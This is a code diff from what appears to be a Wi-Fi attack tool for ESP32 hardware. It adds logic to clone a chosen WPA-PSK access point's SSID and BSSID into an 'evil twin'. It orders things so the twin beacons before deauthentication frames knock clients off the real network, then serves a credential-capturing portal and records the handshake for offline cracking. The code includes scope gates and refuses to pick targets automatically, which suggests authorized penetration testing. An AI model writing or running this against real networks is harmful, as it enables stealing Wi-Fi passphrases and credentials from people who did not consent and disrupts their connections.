@@ -450,3 +450,192 @@ export function portalArm({
     warning: 'portal is armed: a stranger\'s device can join this AP and submit credentials to it',
   };
 }
+
+// ── seeding the twin from what is in the air ────────────────────────────────
+//
+// Brad's call: the twin is seeded from a scan rather than typed in by hand. The
+// scan is /scan's `aps[]`: { ssid, bssid, rssi, ch, auth }, where `auth` is the
+// Arduino WiFi.encryptionType enum (firmware/src/main.cpp).
+//
+// The discipline that matters: **this ranks, a human picks.** Auto-selecting the
+// strongest AP would clone whichever neighbour happens to be loudest — the exact
+// "attack something you did not mean to" failure the scope rules exist to stop.
+// So `rankTwinCandidates` is what a UI shows, and `selectTwinTarget` refuses
+// rather than substituting something else when the named AP is not there.
+
+/** Arduino WiFi.encryptionType values (wifi_auth_mode_t), named. */
+export const WIFI_AUTH = {
+  0: 'open', 1: 'wep', 2: 'wpa_psk', 3: 'wpa2_psk', 4: 'wpa_wpa2_psk',
+  5: 'wpa2_enterprise', 6: 'wpa3_psk', 7: 'wpa2_wpa3_psk', 8: 'wapi_psk', 9: 'owe',
+};
+/** The modes where a captured 4-way handshake is a PSK we can attack offline. */
+const CLONEABLE_AUTH = new Set([2, 3, 4]);
+/** Modes we must not pretend to clone into a PSK capture. */
+const WHY_NOT = {
+  0: 'open network — a twin of it captures no PSK, there is nothing to crack',
+  1: 'WEP — trivially crackable, but not with the PSK crack loop; the portal is the wrong tool',
+  5: 'WPA2-Enterprise — the credential is 802.1X, not a PSK; a twin captures an identity, not a passphrase',
+  6: 'WPA3-SAE only — SAE does not hand over a crackable PSK handshake, and PMF makes the knock-off half unreliable',
+  7: 'WPA2/WPA3 mixed — the client may negotiate SAE; treat as WPA3-only and expect PMF trouble',
+  8: 'WAPI — not the tool for this',
+  9: 'OWE (enhanced open) — no PSK at all',
+};
+
+/** Why this AP cannot be cloned into a crackable twin, or null if it can. */
+export function twinRejectReason(ap) {
+  if (!ap) return 'no such AP';
+  const auth = Number(ap.auth);
+  if (Number.isInteger(auth) && WHY_NOT[auth]) return WHY_NOT[auth];
+  const ch = Number(ap.ch);
+  if (!Number.isInteger(ch) || ch < 1 || ch > 14) {
+    return `channel ${ap.ch} is out of the S3's 2.4 GHz range (1..14) — a twin must sit on the target's own channel, one radio`;
+  }
+  const bssid = String(ap.bssid || '');
+  if (!/^([0-9a-f]{2}:){5}[0-9a-f]{2}$/i.test(bssid)) return `bssid ${JSON.stringify(ap.bssid)} is not a MAC`;
+  if (bssid.slice(0, 2).toLowerCase() === '01') return 'bssid is a group address (I/G bit set)';
+  if (!String(ap.ssid ?? '').length) return 'hidden SSID — nothing to match a client profile against';
+  if (!CLONEABLE_AUTH.has(auth)) return `authentication ${WIFI_AUTH[auth] ?? ap.auth} is not a WPA-PSK mode`;
+  return null;
+}
+
+/**
+ * The candidate list a person chooses from. Ranked by signal, because a scan
+ * cannot see clients — so RSSI is a *proxy* for "this one is worth the effort",
+ * not evidence that anyone is home. Said out loud rather than implied.
+ */
+export function rankTwinCandidates(aps, { onlyCloneable = false } = {}) {
+  const list = (Array.isArray(aps) ? aps : []).map((ap) => {
+    const why = twinRejectReason(ap);
+    return {
+      ssid: String(ap.ssid ?? ''),
+      bssid: String(ap.bssid ?? '').toLowerCase(),
+      channel: Number(ap.ch),
+      rssi: ap.rssi === undefined || ap.rssi === null ? null : Number(ap.rssi),
+      auth: WIFI_AUTH[Number(ap.auth)] ?? String(ap.auth),
+      cloneable: why === null,
+      why,
+    };
+  });
+  const kept = onlyCloneable ? list.filter((c) => c.cloneable) : list;
+  // Strongest first; unknown RSSI last rather than treated as 0 dBm.
+  return kept.sort((a, b) => (b.rssi ?? -999) - (a.rssi ?? -999));
+}
+
+/**
+ * Derive the twin's parameters from a *named* AP in a scan.
+ *
+ * Refuses if the named AP is not in the scan, and refuses if it is not
+ * cloneable — it never quietly substitutes a different AP, because "the twin
+ * came up wearing the wrong SSID" is an attack against somebody who was not
+ * chosen. The twin's channel is forced to the target's: one radio, so the AP and
+ * the capture cannot sit on different channels.
+ */
+export function selectTwinTarget(aps, { ssid, bssid } = {}) {
+  if (!ssid && !bssid) {
+    return { ok: false, reason: 'name the target: pass { ssid } or { bssid }. This ranks candidates; it does not pick one.' };
+  }
+  const all = Array.isArray(aps) ? aps : [];
+  const matches = all.filter((ap) => (
+    (ssid ? String(ap.ssid ?? '') === String(ssid) : true) &&
+    (bssid ? String(ap.bssid ?? '').toLowerCase() === String(bssid).toLowerCase() : true)
+  ));
+
+  if (matches.length === 0) {
+    return { ok: false, reason: `no AP in the scan matches ${ssid ? `ssid ${JSON.stringify(ssid)}` : `bssid ${bssid}`}` };
+  }
+  if (matches.length > 1 && !bssid) {
+    // One SSID, several BSSIDs (a mesh, or a repeater). Picking one for you would
+    // be picking one for you.
+    return {
+      ok: false,
+      reason: `${matches.length} APs share that SSID — give a bssid`,
+      candidates: rankTwinCandidates(matches),
+    };
+  }
+
+  const target = matches[0];
+  const why = twinRejectReason(target);
+  if (why) return { ok: false, reason: why, candidate: rankTwinCandidates([target])[0] };
+
+  return {
+    ok: true,
+    twin: {
+      ssid: String(target.ssid),
+      // Clone the BSSID: after the deauth the client rescans for a profile it
+      // already knows, and a matching BSSID resolves to us.
+      bssid: String(target.bssid).toLowerCase(),
+      channel: Number(target.ch),
+      rssi: target.rssi ?? null,
+      auth: WIFI_AUTH[Number(target.auth)] ?? String(target.auth),
+    },
+    // Stated, not implied: RSSI says the AP is audible to us, nothing about whether anyone is on it.
+    note: 'a scan shows the AP, never its clients — RSSI is a proxy for "worth a look", not evidence of a victim',
+  };
+}
+
+// ── the sequencing: portal up FIRST, deauth second ─────────────────────────
+//
+// Brad's call, and the reason is not quietness — it is a race. A client that has
+// just been knocked off rescans for a network it knows. Deauth-first means that
+// rescan happens while our twin is still coming up, so the client finds the REAL
+// AP again and re-joins it: the deauth is spent and the twin never gets a look.
+// Twin-up-first means the matching SSID is already beaconing when the client
+// looks. So the ordering is enforced here as a rule, not left to the caller:
+//
+//     **a deauth is never emitted before the twin has been seen beaconing.**
+//
+// Note the split with the scope gate, because it is deliberate: the deauth half
+// still goes through SCOPE_ALLOWLIST (its target is a named AP/client), while the
+// portal half uses portalArm() (its callers are strangers). One feature, two
+// gates, each matching what it can actually name.
+
+export function nextPortalAction(state = {}) {
+  const {
+    twinUp = false,
+    twinBeaconConfirmed = false,
+    deauthTargets = [],
+    deauthRounds = 0,
+    maxDeauthRounds = 5,
+    clientsLanded = 0,
+    credentialsCaptured = 0,
+  } = state;
+
+  if (!twinUp) {
+    return { action: 'bring_up_twin', allowed: true, reason: 'the twin goes up first' };
+  }
+  if (!twinBeaconConfirmed) {
+    return {
+      action: 'wait_for_beacon',
+      allowed: true,
+      reason: 'the twin must be seen beaconing before anything is knocked off the real AP — ' +
+        'otherwise the client rescans and finds the real one',
+    };
+  }
+  if (deauthTargets.length === 0) {
+    return { action: 'scan_for_clients', allowed: true, reason: 'twin is up and confirmed; nothing to knock off yet' };
+  }
+  if (deauthRounds < maxDeauthRounds && clientsLanded === 0) {
+    return {
+      action: 'deauth',
+      allowed: true,
+      targets: deauthTargets,
+      round: deauthRounds + 1,
+      reason: 'twin is confirmed beaconing, so the knock-off has somewhere to land',
+    };
+  }
+  if (clientsLanded > 0) {
+    return {
+      action: 'serve_portal',
+      allowed: true,
+      clientsLanded,
+      credentialsCaptured,
+      reason: 'a client has landed on the twin — the page does the rest, and the 4-way handshake is captured natively (we are the AP)',
+    };
+  }
+  return {
+    action: 'stop',
+    allowed: false,
+    reason: `gave up after ${deauthRounds} deauth round(s) with no client landing — stop rather than hammer`,
+  };
+}
+
